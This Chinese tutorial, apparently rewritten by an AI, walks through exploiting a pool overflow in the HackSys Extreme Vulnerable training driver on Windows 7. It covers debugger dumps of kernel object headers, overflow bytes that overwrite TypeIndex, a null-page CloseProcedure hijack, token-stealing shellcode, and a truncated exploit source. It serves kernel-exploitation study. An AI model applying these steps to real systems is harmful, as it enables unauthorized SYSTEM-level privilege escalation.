### 优化后的文本

#### 内核对象结构概述
内核对象的结构如下所示：
- `+0x00d TraceFlags` : `UChar`
- `+0x00e InfoMask` : `UChar`
- `+0x00f Flags` : `UChar`
- `+0x010 ObjectCreateInfo` : `Ptr32 _OBJECT_CREATE_INFORMATION`
- `+0x010 QuotaBlockCharged` : `Ptr32 Void`
- `+0x014 SecurityDescriptor` : `Ptr32 Void`
- `+0x018 Body` : 对象体，不同类型的内核对象具有不同的对象体。

例如：`DRIVER_OBJECT`, `DEVICE_OBJECT`, `FILE_OBJECT` 等。

#### 事件对象的创建与存储
当使用 `CreateEvent` 创建事件对象时，该对象在内核中存储于 pool chunk 中。其结构如下：
```
| PoolHeader |
|_OBJECT_HEADER_QUOTA_INFO|
|_OBJECT_HEADER|
| Body (对象体) |
```

我们关注的是 `_OBJECT_HEADER` 结构中的 `TypeIndex` 字段，它作为全局数组 `ObTypeIndexTable` 的索引。`ObTypeIndexTable` 存储了各种“对象类型”的信息。

#### 示例分析
以下是一个具体的示例，展示了如何通过调试工具查看和修改内核对象的 `_OBJECT_HEADER` 数据：

1. **获取对象头数据**
   ```kd> dt nt!_OBJECT_HEADER 85b10ac0+8+10 .```
   输出结果：
   ```
   +0x000 PointerCount     : 0n1
   +0x004 HandleCount      : 0n1
   +0x004 NextToFree       :
   +0x008 Lock             :
      +0x000 Locked           : 0y0
      +0x000 Waiting          : 0y0
      +0x000 Waking           : 0y0
      +0x000 MultipleShared   : 0y0
      +0x000 Shared           : 0y0000000000000000000000000000 (0)
      +0x000 Value            : 0
      +0x000 Ptr              : (null)
   +0x00c TypeIndex        : 0xc ''
   +0x00d TraceFlags       : 0 ''
   +0x00e InfoMask         : 0x8 ''
   +0x00f Flags            : 0 ''
   +0x010 ObjectCreateInfo :
   +0x010 QuotaBlockCharged :
   +0x014 SecurityDescriptor :
   +0x018 Body             :
      +0x000 UseThisFieldToCopy : 0n262145
      +0x000 DoNotUseThisField : 1.2951683872905357532e-318
   ```

2. **确定对象类型**
   从上述输出中可以看到，`TypeIndex` 为 0xc。我们可以进一步查看 `ObTypeIndexTable[0xc]` 中的信息：
   ```kd> dd nt!ObTypeIndexTable```
   输出结果：
   ```
   82b8a900  00000000 bad0b0b0 8564e900 8564e838
   82b8a910  8564e770 8564e570 856ee040 856eef78
   82b8a920  856eeeb0 856eede8 856eed20 856ee6a0
   82b8a930  85763418 8571f878 856fb430 856fb368
   82b8a940  8570f430 8570f368 8575b448 8575b380
   82b8a950  8576b450 8576b388 857539c8 85753900
   82b8a960  85753838 856ef7a8 856ef6e0 856ef618
   82b8a970  856f39b8 856f34f0 856f3428 8573df78
   ```

   具体查看 `ObTypeIndexTable[0xc]` 的内容：
   ```kd> dt nt!_OBJECT_TYPE 85763418 .```
   输出结果：
   ```
   +0x000 TypeList         :  [ 0x85763418 - 0x85763418 ]
      +0x000 Flink            : 0x85763418 _LIST_ENTRY [ 0x85763418 - 0x85763418 ]
      +0x004 Blink            : 0x85763418 _LIST_ENTRY [ 0x85763418 - 0x85763418 ]
   +0x008 Name             :  "Event"
      +0x000 Length           : 0xa
      +0x002 MaximumLength    : 0xc
      +0x004 Buffer           : 0x8c605570  "Event"
   +0x010 DefaultObject    :
   +0x014 Index            : 0xc ''
   +0x018 TotalNumberOfObjects : 0x3c66
   +0x01c TotalNumberOfHandles : 0x3ca0
   +0x020 HighWaterNumberOfObjects : 0x4827
   +0x024 HighWaterNumberOfHandles : 0x487c
   +0x028 TypeInfo         :
      +0x000 Length           : 0x50
      +0x002 ObjectTypeFlags  : 0 ''
      +0x002 CaseInsensitive  : 0y0
      +0x002 UnnamedObjectsOnly : 0y0
      +0x002 UseDefaultObject : 0y0
      +0x002 SecurityRequired : 0y0
      +0x002 MaintainHandleCount : 0y0
      +0x002 MaintainTypeList : 0y0
      +0x002 SupportsObjectCallbacks : 0y0
      +0x004 ObjectTypeCode   : 2
      +0x008 InvalidAttributes : 0x100
      +0x00c GenericMapping   : _GENERIC_MAPPING
      +0x01c ValidAccessMask  : 0x1f0003
      +0x020 RetainAccess     : 0
      +0x024 PoolType         : 0 ( NonPagedPool )
      +0x028 DefaultPagedPoolCharge : 0
      +0x02c DefaultNonPagedPoolCharge : 0x40
      +0x030 DumpProcedure    : (null)
      +0x034 OpenProcedure    : (null)
      +0x038 CloseProcedure   : (null)
      +0x03c DeleteProcedure  : (null)
      +0x040 ParseProcedure   : (null)
      +0x044 SecurityProcedure : 0x82cac5b6        long  nt!SeDefaultObjectMethod+0
      +0x048 QueryNameProcedure : (null)
      +0x04c OkayToCloseProcedure : (null)
   +0x078 TypeLock         :
      +0x000 Locked           : 0y0
      +0x000 Waiting          : 0y0
      +0x000 Waking           : 0y0
      +0x000 MultipleShared   : 0y0
      +0x000 Shared           : 0y0000000000000000000000000000 (0)
      +0x000 Value            : 0
      +0x000 Ptr              : (null)
   +0x07c Key              : 0x6e657645
   +0x080 CallbackList     :  [ 0x85763498 - 0x85763498 ]
      +0x000 Flink            : 0x85763498 _LIST_ENTRY [ 0x85763498 - 0x85763498 ]
      +0x004 Blink            : 0x85763498 _LIST_ENTRY [ 0x85763498 - 0x85763498 ]
   ```

   由此可知，对象类型为 `Event`。我们需要关注偏移 `0x28` 处的 `TypeInfo` 字段，特别是 `CloseProcedure` 回调函数。

#### 覆盖 `_OBJECT_HEADER` 的 `TypeIndex` 值
为了执行 shellcode，我们可以覆盖 `_OBJECT_HEADER` 的 `TypeIndex` 值为 0，并将 `0x00000000 + (0x28 + 0x28) = 0x60` 处的值修改为我们的 shellcode 地址。这样，在调用 `CloseHandle` 函数时，程序会执行我们指定的代码。

1. **构造数据**
   ```c
   char junk_buffer[504] = { 0x41 };
   memset(junk_buffer, 0x41, 504);
   char overwritedata[41] =
       "\x40\x00\x08\x04"
       "\x45\x76\x65\xee"
       "\x00\x00\x00\x00"
       "\x40\x00\x00\x00"
       "\x00\x00\x00\x00"
       "\x00\x00\x00\x00"
       "\x01\x00\x00\x00"
       "\x01\x00\x00\x00"
       "\x00\x00\x00\x00"
       "\x00\x00\x08\x00";
   char UserModeBuffer[504 + 40 + 1] = {0};
   int UserModeBufferSize = 504 + 40;
   memcpy(UserModeBuffer, junk_buffer, 504);
   memcpy(UserModeBuffer + 504, overwritedata, 40);
   ```

2. **申请内存并写入 shellcode 地址**
   ```c
   *(PULONG)0x00000060 = (ULONG)pShellcodeBuf;
   ```

3. **释放恶意构造的 chunk**
   ```c
   // 释放循环
   for (int i = 0; i < 1000; i++) {
       CloseHandle(event_handle);
   }
   ```

4. **检查内存**
   ```kd> dd 0
   00000000  00000000 00000000 00000000 00000000
   00000010  00000000 00000000 00000000 00000000
   00000020  00000000 00000000 00000000 00000000
   00000030  00000000 00000000 00000000 00000000
   00000040  00000000 00000000 00000000 00000000
   00000050  00000000 00000000 00000000 00000000
   00000060  000d0000 00000000 00000000 00000000
   00000070  00000000 00000000 00000000 00000000
   ```

   在地址 `0x60` 处是我们的 shellcode 地址。

5. **反汇编 shellcode**
   ```kd> uf 000d0000
   000d0000 90              nop
   000d0001 90              nop
   000d0002 90              nop
   000d0003 90              nop
   000d0004 60              pushad
   000d0005 64a124010000    mov     eax,dword ptr fs:[00000124h]
   000d000b 8b4050          mov     eax,dword ptr [eax+50h]
   000d000e 89c1            mov     ecx,eax
   000d0010 8b98f8000000    mov     ebx,dword ptr [eax+0F8h]
   000d0016 ba04000000      mov     edx,4
   000d001b 8b80b8000000    mov     eax,dword ptr [eax+0B8h]
   000d0021 2db8000000      sub     eax,0B8h
   000d0026 3990b4000000    cmp     dword ptr [eax+0B4h],edx
   000d002c 75ed            jne     000d001b  Branch
   000d002e 8b90f8000000    mov     edx,dword ptr [eax+0F8h]
   000d0034 8991f8000000    mov     dword ptr [ecx+0F8h],edx
   000d003a 61              popad
   000d003b c21000          ret     10h
   ```

   Shellcode 的目的是将当前进程的 token 替换为 system 的 token。

#### 总结
本文并未涉及太多内核池的结构和管理相关信息。如果想做更深入的研究，这些知识是必不可少的，务必相当熟悉。学习时，不要只看理论，一定要多调试、跟踪。

#### 参考资料
- Window内核利用教程4池风水 -> 池溢出
- Windows exploit开发系列教程第十六部分：内核利用程序之池溢出
- Windows kernel pool 初探

#### 附：利用代码
```c
#include <windows.h>
#include <stdio.h>
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

// Windows 7 SP1 x86 Offsets
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID
#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define HACKSYS_EVD_IOCTL_POOL_OVERFLOW                   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef NTSTATUS(WINAPI *NtAllocateVirtualMemory_t)(IN HANDLE     ProcessHandle,
    IN OUT PVOID  *BaseAddress,
    IN ULONG      ZeroBits,
    IN OUT PULONG AllocationSize,
    IN ULONG      AllocationType,
    IN ULONG      Protect);

NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
```

希望这个优化后的版本能更好地帮助你理解和操作内核对象。